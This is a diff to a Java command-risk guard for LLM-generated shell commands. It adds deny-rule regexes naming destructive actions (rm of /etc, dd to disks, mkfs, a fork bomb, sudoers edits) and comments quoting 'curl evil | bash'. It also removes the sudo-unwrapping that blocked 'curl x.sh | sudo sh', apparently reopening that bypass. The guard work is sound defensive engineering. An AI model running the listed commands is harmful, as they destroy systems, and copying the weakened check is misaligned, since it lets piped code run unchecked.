@@ -10,6 +10,7 @@ import java.util.List;
 import java.util.Locale;
 import java.util.Map;
 import java.util.Set;
+import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
 /**
@@ -28,15 +29,6 @@ public class IntentRiskGuard {
     private static final Set<String> PIPELINE_SEPARATORS = Set.of("|", ";", "&");
 
     /**
-     * 安全重定向惯用写法：fd 复制（{@code 2>&1}、{@code 1>&2}）与丢弃到黑洞（{@code 2>/dev/null}）。
-     * 两者都不写入任何用户可达文件，是极常见且完全无害的 shell 写法（真实 LLM 生成命令时几乎必带）。
-     * 仅从「无条件元字符红线」这一步的检测面里剔除，不影响 guardInput 本身——
-     * 红线正则与管道分段仍在未剔除的原串上运行，真正危险的 {@code > /path}（任意文件写）依旧被拦截。
-     */
-    private static final Pattern SAFE_FD_DUP_REDIRECT = Pattern.compile("\\d?>&\\d");
-    private static final Pattern SAFE_DEVNULL_REDIRECT = Pattern.compile("\\d?>\\s*/dev/null");
-
-    /**
      * shell 解释器 / 命令执行器：管道任一段流向它们即可执行任意代码
      * （经典 {@code curl evil | bash}、{@code ... | sh}、{@code | xargs rm} 攻击），一律红线 BLOCK。
      */
@@ -44,6 +36,24 @@ public class IntentRiskGuard {
             "sh", "bash", "dash", "zsh", "ksh", "csh", "tcsh", "ash", "fish",
             "python", "python2", "python3", "perl", "ruby", "node", "nodejs", "php", "lua",
             "eval", "exec", "source", "xargs", "env");
+
+    private static final List<IntentRule> INTENT_DENY_RULES = List.of(
+            new IntentRule(Pattern.compile("(?is)(?:\\b(?:rm|rmdir|delete|remove|clean|wipe|erase|destroy|purge|format)\\b|删除|删掉|删了|清理|清空|移除|干掉|抹掉|格式化|摧毁|销毁).{0,80}(?:/var/lib/(?:mysql|pgsql|postgresql|docker)(?:\\b|/)|/(?:etc|boot)(?:\\b|/)|/(?:\\s|$)|根目录)|(?:/var/lib/(?:mysql|pgsql|postgresql|docker)(?:\\b|/)|/(?:etc|boot)(?:\\b|/)|根目录).{0,80}(?:\\b(?:rm|rmdir|delete|remove|clean|wipe|erase|destroy|purge)\\b|删除|删掉|删了|移除|干掉|抹掉|格式化|摧毁|销毁)", Pattern.CASE_INSENSITIVE), "destructiveCriticalPathIntent", "Request deletes a protected system or data directory"),
+            new IntentRule(Pattern.compile("(?is)\\bdd\\b.{0,200}\\bof\\s*=\\s*/dev/(?:sd[a-z]+|nvme\\d+n\\d+|vd[a-z]+|xvd[a-z]+)(?:\\b|/)", Pattern.CASE_INSENSITIVE), "rawDeviceWriteIntent", "Request writes directly to a block device"),
+            new IntentRule(Pattern.compile("(?is)\\b(?:mkfs(?:\\.\\w+)?|wipefs|shred)\\b.{0,120}/dev/", Pattern.CASE_INSENSITIVE), "filesystemDestructionIntent", "Request destroys a filesystem or device"),
+            new IntentRule(Pattern.compile(":\\s*\\(\\s*\\)\\s*\\{\\s*:\\s*\\|\\s*:\\s*&\\s*}\\s*;\\s*:", Pattern.CASE_INSENSITIVE), "forkBombIntent", "Request contains a fork bomb"),
+            new IntentRule(Pattern.compile("(?is)fork\\s*(?:炸弹|bomb)|:\\s*\\(\\s*\\)\\s*\\{|(?:写|制造|制作|生成|搞|弄|来).{0,14}(?:占满|跑满|吃满|打满|耗尽).{0,6}(?:cpu|内存|资源)", Pattern.CASE_INSENSITIVE), "resourceExhaustionIntent", "Request intends a fork bomb or CPU/memory exhaustion"),
+            new IntentRule(Pattern.compile("(?is)(?:\\b(?:write|modify|edit|append|add)\\b|写入|修改|追加|添加).{0,100}/etc/sudoers(?:\\.d/\\S+)?|/etc/sudoers(?:\\.d/\\S+)?.{0,100}(?:NOPASSWD|写入|修改|追加|添加)", Pattern.CASE_INSENSITIVE), "privilegeEscalationIntent", "Request modifies sudoers or grants elevated privileges"),
+            new IntentRule(Pattern.compile("(?is)\\bchmod\\s+(?:-R\\s+)?0?777\\s+/(?:\\s|$)|(?:chmod|权限).{0,80}(?:777|全权限).{0,80}(?:根目录|/)"), "rootPermissionIntent", "Request grants unsafe permissions on the root filesystem"));
+
+    private static final Pattern OUTPUT_REDIRECTION = Pattern.compile("(?<![<>=])(?:\\d?)(>>?)\\s*([^\\s;|&]+)");
+    /**
+     * 大模型常在运维命令前自行添加 sudo，但权限边界应由最小权限执行器统一管理。
+     * 这里只剥离无身份切换能力的普通前缀（sudo / sudo -n / sudo --）；
+     * sudo -u/-g 等主动指定身份的形式不做规范化，后续按高风险包装器拒绝。
+     */
+    private static final Pattern SAFE_SUDO_PREFIX = Pattern.compile(
+            "(?i)^\\s*(?:/usr/bin/)?sudo\\s+(?:(?:-n)\\s+)?(?:--\\s+)?(?=[A-Za-z0-9_./])");
 
     /**
      * 同形字（confusables）映射：Cyrillic / Greek 等与 ASCII 字母形近的字符 → ASCII，
@@ -89,14 +99,9 @@ public class IntentRiskGuard {
         String normalized = normalizeCommand(cmd);
         String guardInput = normalized.isBlank() ? cmd : normalized;
 
-        // 1. 高危元字符红线：命令替换/重定向/换行，无条件 BLOCK（不可借分段规避）。
-        // 检测前先剔除安全重定向惯用写法（2>&1、2>/dev/null），避免真实 LLM 生成的
-        // 完全无害命令被误杀；仅影响本步检测面，guardInput 原串不变，下游红线正则/
-        // 管道分段仍按未剔除的原串裁决，任意文件写重定向（> /path）依旧无条件拦截。
-        String metacharCheckSurface = SAFE_DEVNULL_REDIRECT.matcher(
-                SAFE_FD_DUP_REDIRECT.matcher(guardInput).replaceAll(" ")).replaceAll(" ");
+        // 1. 高危元字符红线：命令替换/重定向/换行，无条件 BLOCK（不可借分段规避）
         for (String mc : hardBlockedMetacharacters) {
-            if (metacharCheckSurface.contains(mc)) {
+            if (guardInput.contains(mc)) {
                 return new RiskDecision(cmd, RiskLevel.BLOCK,
                         "包含禁止的 shell 元字符 '" + mc + "'，可能用于命令替换/重定向/注入", "metacharacter");
             }
@@ -109,6 +114,9 @@ public class IntentRiskGuard {
             }
         }
 
+        RiskDecision redirectionDecision = evaluateOutputRedirection(cmd, guardInput);
+        if (redirectionDecision != null) return redirectionDecision;
+
         // 3. 管道/连接符分段：逐段裁决取最高风险（全段只读则整体 READONLY 放行）
         List<String> segments = splitPipeline(guardInput);
         if (segments.size() > 1) {
@@ -118,13 +126,10 @@ public class IntentRiskGuard {
                     continue;
                 }
                 List<String> segArgv = tokenize(seg);
-                if (!segArgv.isEmpty()) {
-                    String realBin = unwrapPrivilegeCommand(segArgv);
-                    if (SHELL_INTERPRETERS.contains(realBin)) {
-                        return new RiskDecision(cmd, RiskLevel.BLOCK,
-                                "管道向 shell 解释器/命令执行器（" + realBin + "）传递，可执行任意代码",
-                                "pipeToInterpreter");
-                    }
+                if (!segArgv.isEmpty() && SHELL_INTERPRETERS.contains(basename(segArgv.get(0)))) {
+                    return new RiskDecision(cmd, RiskLevel.BLOCK,
+                            "管道向 shell 解释器/命令执行器（" + basename(segArgv.get(0)) + "）传递，可执行任意代码",
+                            "pipeToInterpreter");
                 }
             }
             RiskLevel worst = RiskLevel.READONLY;
@@ -151,6 +156,59 @@ public class IntentRiskGuard {
         return evaluateSingle(cmd, guardInput);
     }
 
+    public RiskDecision evaluateIntent(String instruction) {
+        if (instruction == null || instruction.isBlank()) return null;
+        String normalized = normalizeCommand(instruction);
+        for (IntentRule rule : INTENT_DENY_RULES) {
+            if (rule.pattern().matcher(normalized).find()) return new RiskDecision(instruction, RiskLevel.BLOCK, rule.reason(), rule.id());
+        }
+        return null;
+    }
+
+    /**
+     * 将模型候选命令规范化为由执行器接管权限的形式，避免 "sudo systemctl ..." 让护栏
+     * 只看到最外层 sudo。该方法只接受安全的普通 sudo 前缀，不接受 -u/-g 等身份切换参数。
+     */
+    public String canonicalizeModelCommand(String command) {
+        if (command == null || command.isBlank()) return command;
+        Matcher matcher = SAFE_SUDO_PREFIX.matcher(command);
+        return matcher.find() ? command.substring(matcher.end()).trim() : command.trim();
+    }
+
+    /**
+     * 原始意图明确要求变更核心服务时，为模型候选命令设置不可降低的风险下限。
+     * 只升级已经被判定为变更的、且确实指向同一服务的命令；status/is-active 等只读命令不升级。
+     */
+    public RiskDecision enforceCriticalServiceIntentFloor(String instruction, RiskDecision decision) {
+        if (decision == null || decision.level() == RiskLevel.BLOCK
+                || decision.level() == RiskLevel.READONLY || decision.level() == RiskLevel.IRREVERSIBLE) {
+            return decision;
+        }
+        String service = requestedCriticalServiceChange(instruction);
+        if (service == null || !commandMentionsService(decision.command(), service)) {
+            return decision;
+        }
+        List<String> matched = new ArrayList<>(decision.matchedRules());
+        if (!matched.contains("criticalServiceIntent")) matched.add("criticalServiceIntent");
+        List<String> reasons = new ArrayList<>(decision.reasons());
+        reasons.add("原始意图明确要求变更核心服务（" + service + "），风险等级不得由模型命令写法降级");
+        return new RiskDecision(decision.command(), RiskLevel.IRREVERSIBLE,
+                DecisionAction.REQUIRE_APPROVAL, true, true, true,
+                matched, reasons, "先完成服务状态与配置检查，建立恢复点后再执行强确认。",
+                decision.normalizedInput(), decision.originalInputHash());
+    }
+
+    private RiskDecision evaluateOutputRedirection(String cmd, String input) {
+        Matcher matcher = OUTPUT_REDIRECTION.matcher(input);
+        while (matcher.find()) {
+            String target = matcher.group(2);
+            if (target == null || target.isBlank() || target.startsWith("&") || "/dev/null".equals(target)) continue;
+            RiskLevel level = touchesCriticalPath(List.of(target)) ? RiskLevel.IRREVERSIBLE : RiskLevel.EXECUTABLE;
+            return new RiskDecision(cmd, level, "Output redirection writes to " + target + " and requires review", "outputRedirection");
+        }
+        return null;
+    }
+
     /** 对单条（已分段、无管道）命令裁决。 */
     private RiskDecision evaluateSingle(String cmd, String segmentInput) {
         List<String> argv = tokenize(segmentInput);
@@ -158,6 +216,19 @@ public class IntentRiskGuard {
             return new RiskDecision(cmd, RiskLevel.BLOCK, "无法解析指令", "unparseable");
         }
         String binary = basename(argv.get(0));
+        if ("sudo".equalsIgnoreCase(binary)) {
+            String inner = canonicalizeModelCommand(segmentInput);
+            if (inner == null || inner.equals(segmentInput.trim())) {
+                return new RiskDecision(cmd, RiskLevel.BLOCK,
+                        "模型命令不得通过 sudo 指定执行身份或附加提权参数，权限必须由最小权限执行器统一管理",
+                        "privilegeWrapper");
+            }
+            argv = tokenize(inner);
+            if (argv.isEmpty()) {
+                return new RiskDecision(cmd, RiskLevel.BLOCK, "sudo 后缺少实际命令", "privilegeWrapper");
+            }
+            binary = basename(argv.get(0));
+        }
         RiskDecision commandSurfaceDecision = evaluateCommandSurface(cmd, argv, binary);
         if (commandSurfaceDecision != null) {
             return commandSurfaceDecision;
@@ -192,6 +263,7 @@ public class IntentRiskGuard {
                 "未在白名单内的指令（" + binary + "），默认需人工确认", "unknown");
     }
 
+    /** /etc/passwd 可用于只读账户排查，但任何原地改写都属于系统账户红线。 */
     /**
      * 引号感知的管道/连接符分段：仅在引号外遇到 | ; &amp; 时切分，
      * 引号内的元字符（如 {@code sed 's/a|b/c/'}）不切分。
@@ -207,6 +279,8 @@ public class IntentRiskGuard {
                 cur.append(c);
             } else if (c == '\'' || c == '"') {
                 quote = c;
+                cur.append(c);
+            } else if (c == '&' && i > 0 && s.charAt(i - 1) == '>') {
                 cur.append(c);
             } else if (c == '|' || c == ';' || c == '&') {
                 segments.add(cur.toString().trim());
@@ -254,8 +328,37 @@ public class IntentRiskGuard {
         return false;
     }
 
+    private String requestedCriticalServiceChange(String instruction) {
+        if (instruction == null || instruction.isBlank() || rules.getCriticalServices().isEmpty()) return null;
+        String normalized = normalizeCommand(instruction).toLowerCase(Locale.ROOT);
+        boolean chineseRequest = Pattern.compile(
+                "(?is)(?:帮我|请|执行|立即|马上|直接|需要|要求).{0,24}(?:重启|启动|停止|重载|重新加载)")
+                .matcher(normalized).find();
+        boolean commandStyle = Pattern.compile("(?is)\\b(?:restart|start|stop|reload)\\b")
+                .matcher(normalized).find();
+        if (!chineseRequest && !commandStyle) return null;
+        for (String service : rules.getCriticalServices()) {
+            String lower = service.toLowerCase(Locale.ROOT);
+            if (normalized.contains(lower) || normalized.contains(lower + ".service")) return lower;
+        }
+        return null;
+    }
+
+    private boolean commandMentionsService(String command, String service) {
+        if (command == null || service == null) return false;
+        for (String token : tokenize(canonicalizeModelCommand(command))) {
+            String normalized = basename(token).toLowerCase(Locale.ROOT);
+            if (normalized.equals(service) || normalized.equals(service + ".service")) return true;
+        }
+        return false;
+    }
+
     private RiskDecision evaluateCommandSurface(String cmd, List<String> argv, String binary) {
         return switch (binary) {
+            case "systemctl" -> evaluateSystemctl(cmd, argv);
+            case "service" -> evaluateService(cmd, argv);
+            case "nginx" -> evaluateNginx(cmd, argv);
+            case "firewall-cmd" -> evaluateFirewallCmd(cmd, argv);
             case "find" -> evaluateFind(cmd, argv);
             case "docker" -> evaluateDocker(cmd, argv);
             case "kubectl" -> evaluateKubectl(cmd, argv);
@@ -272,6 +375,28 @@ public class IntentRiskGuard {
                     "taskkill 会终止 Windows 进程，需人工确认", "taskkillMutating");
             default -> null;
         };
+    }
+
+    private RiskDecision evaluateSystemctl(String cmd, List<String> argv) {
+        String sub = firstNonOption(argv, 1);
+        if (sub != null && List.of("status", "is-active", "is-enabled", "show", "list-units", "list-unit-files", "list-dependencies", "cat").contains(sub.toLowerCase(Locale.ROOT))) return new RiskDecision(cmd, RiskLevel.READONLY, "systemctl query subcommand", "systemctlReadOnly");
+        // 停用/禁用/屏蔽防火墙类服务（firewalld/ufw/iptables/nftables）等同于主动关闭安全防线，
+        // 对齐 MITRE ATT&CK T1562.004（Disable or Modify System Firewall）：一律红线拒绝，
+        // 不可通过人工确认放行——这不是"高风险但可能是合法运维需求"，而是攻击链的经典前置动作。
+        if (sub != null && List.of("stop", "disable", "mask").contains(sub.toLowerCase(Locale.ROOT)) && touchesSecurityService(argv)) return new RiskDecision(cmd, RiskLevel.BLOCK, "禁止停用/禁用安全防护服务（防火墙），命中安全红线", "systemctlSecurityServiceChange");
+        return null;
+    }
+    private RiskDecision evaluateService(String cmd, List<String> argv) {
+        if ("status".equalsIgnoreCase(firstNonOption(argv, 2))) return new RiskDecision(cmd, RiskLevel.READONLY, "service status query", "serviceReadOnly");
+        return null;
+    }
+    private RiskDecision evaluateNginx(String cmd, List<String> argv) {
+        if (containsAny(argv, "-t", "-T", "-v", "-V", "-h", "--help")) return new RiskDecision(cmd, RiskLevel.READONLY, "nginx configuration or version query", "nginxReadOnly");
+        return new RiskDecision(cmd, RiskLevel.EXECUTABLE, "nginx invocation may change service state", "nginxUnknown");
+    }
+    private RiskDecision evaluateFirewallCmd(String cmd, List<String> argv) {
+        for (String arg : argv) { String option = arg.toLowerCase(Locale.ROOT); if (option.startsWith("--list") || option.equals("--state") || option.startsWith("--get-") || option.startsWith("--query-") || option.equals("--help") || option.equals("--version")) return new RiskDecision(cmd, RiskLevel.READONLY, "firewall-cmd query", "firewallCmdReadOnly"); }
+        return new RiskDecision(cmd, RiskLevel.EXECUTABLE, "firewall-cmd may change firewall rules", "firewallCmdMutating");
     }
 
     private RiskDecision evaluateFind(String cmd, List<String> argv) {
@@ -429,6 +554,11 @@ public class IntentRiskGuard {
         return false;
     }
 
+    private boolean touchesSecurityService(List<String> argv) {
+        for (String tok : argv) { String unit = basename(tok).toLowerCase(Locale.ROOT); if (List.of("firewalld", "firewalld.service", "ufw", "ufw.service", "iptables", "nftables").contains(unit)) return true; }
+        return false;
+    }
+
     private String firstNonOption(List<String> argv, int from) {
         for (int i = from; i < argv.size(); i++) {
             String arg = argv.get(i);
@@ -468,26 +598,6 @@ public class IntentRiskGuard {
         return idx >= 0 ? token.substring(idx + 1) : token;
     }
 
-    /**
-     * 剥离 sudo/doas 等提权包裹前缀（含其选项），取被包裹的真实命令名。
-     * 防止 {@code curl x.sh | sudo sh} 这类"管道流向被 sudo 包裹的解释器"绕过 pipeToInterpreter 红线——
-     * 旧实现只看每段第一个 token，sudo 打头时直接漏检。
-     */
-    private String unwrapPrivilegeCommand(List<String> argv) {
-        if (argv.isEmpty()) {
-            return "";
-        }
-        String head = basename(argv.get(0));
-        if (!"sudo".equals(head) && !"doas".equals(head)) {
-            return head;
-        }
-        int i = 1;
-        while (i < argv.size() && argv.get(i).startsWith("-")) {
-            i += "-u".equals(argv.get(i)) || "--user".equals(argv.get(i)) ? 2 : 1;
-        }
-        return i < argv.size() ? basename(argv.get(i)) : "";
-    }
-
     private String normalizeCommand(String text) {
         String s = Normalizer.normalize(text, Normalizer.Form.NFKC)
                 .replaceAll("[\\p{Cntrl}\\u200B\\u200C\\u200D\\uFEFF]", "");
@@ -516,4 +626,6 @@ public class IntentRiskGuard {
         }
         return changed ? sb.toString() : s;
     }
+
+    private record IntentRule(Pattern pattern, String id, String reason) {}
 }
